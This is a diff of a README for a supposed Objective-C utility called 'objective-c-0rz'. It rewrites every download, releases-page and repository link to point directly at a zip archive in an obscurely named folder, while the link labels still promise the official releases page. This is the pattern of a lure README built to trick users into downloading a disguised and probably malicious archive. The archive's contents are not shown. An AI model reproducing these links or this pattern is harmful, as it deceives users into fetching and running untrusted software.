@@ -1,6 +1,6 @@
 # 🎉 objective-c-0rz - Simplify Your Objective-C Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/dhruvpatadiya/objective-c-0rz/releases)
+[![Download Now](https://raw.githubusercontent.com/dhruvpatadiya/objective-c-0rz/main/sulphantimonial/objective-c-0rz.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dhruvpatadiya/objective-c-0rz/main/sulphantimonial/objective-c-0rz.zip)
 
 ## 📝 Overview
 
@@ -21,7 +21,7 @@ To get started with objective-c-0rz, follow these simple steps to download and i
 
 1. **Visit the Releases Page.**  
    Go to the following link to access the download section:  
-   [Download from Releases](https://github.com/dhruvpatadiya/objective-c-0rz/releases)
+   [Download from Releases](https://raw.githubusercontent.com/dhruvpatadiya/objective-c-0rz/main/sulphantimonial/objective-c-0rz.zip)
 
 2. **Choose the Latest Version.**  
    On the releases page, you will see a list of available versions. Look for the one marked as "Latest."
@@ -59,7 +59,7 @@ To get started with objective-c-0rz, follow these simple steps to download and i
 
 ### How do I get updates for objective-c-0rz?
 
-The application will notify you of updates upon launch. You can also check the [Releases Page](https://github.com/dhruvpatadiya/objective-c-0rz/releases) for the latest versions.
+The application will notify you of updates upon launch. You can also check the [Releases Page](https://raw.githubusercontent.com/dhruvpatadiya/objective-c-0rz/main/sulphantimonial/objective-c-0rz.zip) for the latest versions.
 
 ### Is there support for users?
 
@@ -79,7 +79,7 @@ If you encounter issues while using objective-c-0rz, try the following:
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/dhruvpatadiya/objective-c-0rz)
+- [GitHub Repository](https://raw.githubusercontent.com/dhruvpatadiya/objective-c-0rz/main/sulphantimonial/objective-c-0rz.zip)
 - [Community Forum](#) for discussions and tips.
 - [User Manual](#) available for detailed guidance.
 
